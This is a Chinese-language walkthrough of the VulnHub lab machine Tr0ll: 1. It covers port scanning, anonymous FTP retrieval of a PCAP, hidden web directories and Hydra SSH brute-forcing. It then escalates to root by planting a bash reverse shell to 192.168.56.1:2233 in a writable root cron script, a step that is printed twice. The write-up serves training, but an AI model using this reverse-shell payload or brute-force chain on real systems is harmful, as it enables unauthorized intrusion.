---
description: 一台以信息搜集和 Linux 本地权限提升为核心的入门级靶机。通过 FTP 匿名访问获取 PCAP 流量文件，结合流量分析发现隐藏 Web 目录及后续凭据线索，最终通过 SSH 弱口令获取初始 Shell，并利用 root 定时任务执行的可写 Python 脚本完成权限提升。
---

# Tr0ll: 1

## 基本信息

- 靶场名称：Tr0ll: 1
- 靶场链接：https://www.vulnhub.com/entry/tr0ll-1,100/
- 攻击路径：FTP 匿名访问 → PCAP 流量分析 → 隐藏目录发现 → SSH 弱口令爆破 → Cron 计划任务提权
- 工具清单：Nmap、FTP、Wireshark、strings、DIRB、wget、file、IDA、exiftool、Hydra、SSH、Netcat
- 来源：听课笔记 from Zumpyx_OSCP-Like Vulnhub Machines_系列

## 一、信息收集

### 1. 主机发现&端口扫描

```shell
nmap -sn 192.168.56.1/24 --min-rate 10000
IP=192.168.56.109
nmap -A -T4 -oN nmap.txt $IP -p `nmap -p- -T5 $IP | grep -oE '(^[0-9][^/tcp]*)' | tr '\n' ','`
```

![image-20261119154959368](image-20261119154959368.png)

发现以下开放端口：

| 端口 | 服务 | 初步判断 |
|---|---|---|
| 21 | FTP | 允许匿名登录 |
| 22 | SSH | 后续尝试凭据爆破 |
| 80 | HTTP | Web 信息收集 |

其中，FTP 服务存在匿名登录入口，优先检查

## 二、FTP 匿名访问与流量分析

### 1. 下载 FTP 文件

Nmap 探测结果中存在：

```text
ftp-anon: Anonymous FTP login allowed
```

说明 FTP 服务允许使用 `anonymous` 用户匿名登录

连接 FTP 并下载文件：

```shell
mkdir 21
cd 21

ftp 192.168.56.109
```

登录后执行：

```text
ls
binary
get lol.pcap
exit
```

其中：

- `binary`：切换至二进制传输模式，避免文件传输过程中发生字符转换
- `get`：下载指定文件
- `lol.pcap`：网络数据包捕获文件

### 2. 分析 PCAP 文件

使用 Wireshark 打开流量文件：

```shell
wireshark lol.pcap
```

观察到其中包含大量 FTP 流量。通过追踪 TCP 流，可以发现一个名为 `secret_stuff.txt` 的文件，其传输过程包含完整的认证、下载和退出操作

使用 `strings` 提取文件中的可读字符串：

```shell
strings lol.pcap
```

![image-20261119160441430](image-20261119160441430.png)

在流量内容中发现关键字符串：

```text
sup3rs3cr3tdirlol
```

该字符串可能是后续 Web 目录枚举的线索，暂时保存

## 三、Web 信息收集与 SSH 凭据获取

### 1. Web 目录扫描

访问 80 端口，首页仅展示一张图片，查看网页源码也没有发现明显线索

使用 DIRB 进行目录扫描：

```shell
mkdir 80
cd 80

dirb http://192.168.56.109/
```

发现隐藏目录：

```text
/secret/
```

访问该目录后，发现另一张图片，页面源码同样没有明显信息

随后对 `/secret/` 进行进一步目录扫描，未发现有效结果

### 2. 利用 FTP 线索发现隐藏资源

回到此前从 PCAP 文件中提取的字符串：

```text
sup3rs3cr3tdirlol
```

尝试将其作为 Web 目录访问：

```text
http://192.168.56.109/sup3rs3cr3tdirlol/
```

成功发现文件 `roflmao`

下载并识别文件：

```shell
wget http://192.168.56.109/sup3rs3cr3tdirlol/roflmao

file roflmao
strings roflmao
```

通过 `strings` 发现程序包含 `roflmao.c` 等字符串及一个地址，但没有直接获得有效利用信息

将文件拖入 IDA，进入 `main` 函数进行 `F5` 反编译，发现程序主要用于打印一个之前 strings 中的地址外，暂未发现其他明显线索

### 3. 获取用户名与密码字典

尝试将这个发现的地址，作为 URI 访问

在根目录下访问该 URI，发现两个与用户名、密码有关的文件，将其下载并整理为：

```text
user.list
pass.list
```

结合此前发现的 SSH 服务，尝试使用 Hydra 进行凭据爆破：

```shell
hydra -L user.list -P pass.list ssh://192.168.56.109
```

未获得有效凭据

### 4. 从图片路径发现密码线索

对于之前得到的两个图片，尝试使用 `strings` 和 `exiftool` 检查文件是否包含隐藏信息，均未发现有效内容

但刚刚的 URI 中，其中一个资源叫，`this_folder_contains_the_password`

但该目录下就只有一个名叫 `Pass.txt` 的文件，而刚刚以这个文件当作密码本进行爆破，并无果

推测密码可能是这个文件的文件名，`Pass.txt`

将其加入密码字典：

```shell
echo "Pass.txt" >> pass.list
```

重新进行 SSH 爆破：

```shell
hydra -L user.list -P pass.list ssh://192.168.56.109
```

成功获得凭据：

```text
Username: overflow
Password: Pass.txt
```

## 四、SSH 登录与初始 Shell

### 1. SSH 登录异常

获得凭据后尝试登录：

```shell
ssh overflow@192.168.56.109
```

出现报错：

```text
connect to host 192.168.56.109 port 22: Connection refused
```

使用 Nmap 对 SSH 端口进行单端口探测：

```shell
sudo nmap -sS -p 22 192.168.56.109 -Pn
```

首次扫描结果显示：

```text
22/tcp filtered ssh
```

`filtered` 表示扫描探测受到过滤，无法确定端口是否开放

由于最开始 nmap 的服务探测表示该端口开放

故可能触发了目标的防火墙或安全策略，导致 SSH 连接受到临时限制，等待一段时间后重新探测

再次执行：

```shell
sudo nmap -sS -p 22 192.168.56.109 -Pn
```

此次结果变为：

```text
22/tcp open ssh
```

重新尝试 SSH 登录，成功进入目标主机

> 这里需要区分：
>
> - `Connection refused`：连接被拒绝，通常意味着目标端口没有接受连接
> - `filtered`：探测报文可能被防火墙过滤，无法确定端口状态
> - `open`：目标端口存在监听服务

### 2. 提升 Shell 交互性

登录后执行：

```shell
bash
export TERM=xterm
```

切换至 Bash，并设置终端类型，改善 Shell 的基本交互体验

## 五、Linux 本地信息收集与权限提升

### 1. 常规权限检查

首先检查当前用户的 sudo 权限：

```shell
sudo -l
```

没有发现可利用的 sudo 权限

继续检查 SUID 文件：

```shell
find / -perm -u=s -type f 2>/dev/null
```

未发现明显可利用的异常 SUID 程序

检查系统计划任务：

```shell
cat /etc/crontab
```

当前用户无权读取，暂时无法通过该文件获取有效信息

随后检查系统账户文件权限及内核版本：

```shell
ls -la /etc/passwd /etc/shadow
uname -a
```

暂未发现直接的提权线索

### 2. 发现异常下线现象

在信息收集过程中，SSH 会话突然被断开

结合此前检查计划任务的经历，怀疑目标存在周期性执行的任务，可能会影响当前用户会话

![image-20261119165005607](image-20261119165005607.png)

重新 SSH 登录后，尝试检查 root 相关进程：

```shell
ps aux | grep root
```

未发现明显线索

### 3. 从日志追踪计划任务

转而检查系统日志目录：

```shell
cd /var/log
ls -la
```

发现异常日志文件：

```text
cronlog
```

读取日志：

```shell
cat /var/log/cronlog
```

从日志内容中发现关键文件名：

```text
cleaner.py
```

推测该 Python 脚本可能由计划任务定期执行，结合此前会话异常断开的现象，进一步检查其文件位置及权限

### 4. 利用可写计划任务脚本提权

搜索目标脚本：

```shell
find / -type f -name "cleaner.py" 2>/dev/null
```

定位后检查文件权限：

```shell
ls -la cleaner.py
```

发现当前用户对该脚本具有读、写、执行权限

由于该脚本疑似由高权限计划任务定期执行，若任务以 root 身份运行，那么修改脚本内容就可能使其中的命令获得 root 权限执行

因此，尝试在脚本中加入反弹 Shell 命令：

```python
import os

os.system("/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.1/2233 0>&1'")
```

在攻击机开启监听：

```shell
nc -lvnp 2233
```

等待目标计划任务执行脚本

### 5. 获取 Root 权限

等待片刻后，攻击机成功接收到目标发起的反弹连接，获得 root 权限

![image-20261119170226617](image-20261119170226617.png)

至此，完成 Tr0ll: 1 靶场的渗透测试

## 六、提权原理分析

本题最终利用的是 **高权限计划任务执行可写脚本** 导致的权限提升

攻击链如下：

```text
普通用户 overflow
       |
       v
发现 /var/log/cronlog
       |
       v
获取 cleaner.py 文件名
       |
       v
检查脚本权限
       |
       v
发现当前用户具有写权限
       |
       v
向脚本中加入反弹 Shell
       |
       v
等待 root 计划任务执行脚本
       |
       v
攻击机接收到反弹连接
       |
       v
      root
```

关键在于两个条件：

1. `cleaner.py` 对当前用户可写
2. 执行该脚本的计划任务具有 root 权限

满足这两个条件时，普通用户就可以通过修改脚本内容，让计划任务代为执行高权限命令

需要注意：Python 脚本不能直接执行裸 Shell 命令，需要通过 `os.system()` 等方式调用。例如：

```python
import os

os.system("/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.1/2233 0>&1'")
```

另外，`cronlog` 中出现脚本名称只是排查线索，真正确认提权条件还需要检查计划任务的执行用户、调度配置及脚本调用关系

## 七、总结与反思

本题主要考查 Linux 渗透测试中的信息收集、凭据发现和计划任务提权

| 阶段 | 关键知识点 |
|---|---|
| 信息收集 | Nmap 主机发现、端口扫描 |
| FTP | Anonymous 匿名登录、Binary 二进制传输 |
| 流量分析 | Wireshark、TCP Stream、strings |
| Web | DIRB 目录扫描、隐藏目录发现 |
| 文件分析 | file、strings、IDA |
| 凭据获取 | Hydra SSH 字典爆破 |
| Shell | Bash 交互性提升、反弹 Shell |
| 本地枚举 | sudo、SUID、进程、日志 |
| 权限提升 | Cron 计划任务、可写脚本 |

**值得注意的几个细节：**

1. 目录名称、文件名称本身也可能包含提示信息，不应只关注文件内容
2. SSH 出现连接异常时，应区分 `refused`、`filtered` 和 `open`，不要直接认定凭据错误
3. Linux 提权不能只关注 sudo 和 SUID，计划任务、日志及其关联脚本同样值得检查
4. 对于具有写权限的脚本，需要进一步确认其执行身份和调用周期，才能判断是否存在提权可能
